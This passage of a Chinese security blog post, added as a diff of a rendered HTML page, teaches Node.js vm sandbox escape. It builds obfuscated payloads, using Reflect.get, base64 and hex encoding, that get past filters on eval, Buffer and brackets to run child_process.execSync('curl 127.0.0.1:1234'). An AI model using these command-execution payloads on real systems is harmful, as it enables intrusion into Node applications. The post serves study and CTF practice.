class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">68</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">70</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">78</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">53</span>\<span class="hljs-keyword">x</span><span class="hljs-number">79</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">32</span>\<span class="hljs-keyword">x</span><span class="hljs-number">37</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">30</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">30</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>a\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">32</span>\<span class="hljs-keyword">x</span><span class="hljs-number">33</span>\<span class="hljs-keyword">x</span><span class="hljs-number">34</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>&#x27;)</code></pre></div>
+
+<p>如果过滤了<code>eval</code>关键字，可以用<code>includes(&#39;eva&#39;)</code>来搜索<code>eval</code>函数，也可以用<code>startswith(&#39;eva&#39;)</code>来搜索</p>
+<h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><blockquote>
+<p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code>。</p>
+</blockquote>
+<p>所以取eval函数的方式可以变成</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eva&#x27;</span>)))</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-string">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span class="hljs-string">`base64`</span>).<span class="hljs-title function_">toString</span>())</code></pre></div>
+
+
+
+
+
+
+
+<p>这里过滤了<code>base64</code>，可以直接换成</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-string">`base`</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-number">64</span>)</code></pre></div>
+
+<p>过滤掉了<code>Buffer</code>，可以换成</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))</code></pre></div>
+
+<p>要拿到<code>Buffer.from</code>方法，可以通过下标</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>))))[<span class="hljs-number">1</span>]</code></pre></div>
+
+<p>但问题在于，关键字还过滤了中括号，这一点简单，再加一层<code>Reflect.get</code></p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))),<span class="hljs-number">1</span>)</code></pre></div>
+
+<p>所以基本payload变成</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))),<span class="hljs-number">1</span>)(<span class="hljs-string">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span class="hljs-string">`base`</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-number">64</span>)).<span class="hljs-title function_">toString</span>()</code></pre></div>
+
+<p>eval只会进行解码，不会执行，所以要再套一层eval</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eva&#x27;</span>)))(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))),<span class="hljs-number">1</span>)(<span class="hljs-string">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span class="hljs-string">`base`</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-number">64</span>)).<span class="hljs-title function_">toString</span>())</code></pre></div>
+
+<p>也可以拿到eval后写入16进制字符串</p>
+<div class="code-wrapper"><pre><code class="hljs r">Reflect.get<span class="hljs-punctuation">(</span>global<span class="hljs-punctuation">,</span> Reflect.ownKeys<span class="hljs-punctuation">(</span>global<span class="hljs-punctuation">)</span>.find<span class="hljs-punctuation">(</span>x<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>x.includes<span class="hljs-punctuation">(</span>`eva`<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span>`\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29`<span class="hljs-punctuation">)</span></code></pre></div>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vm沙箱逃逸初识</div>
+      <div>https://zer0peach.github.io/2023/11/20/vm沙箱逃逸初识/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/21/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/" title="0xGAME-WEB 复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">0xGAME-WEB 复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/15/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/" title="提及rasp的java题">
+                        <span class="hidden-mobile">提及rasp的java题</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
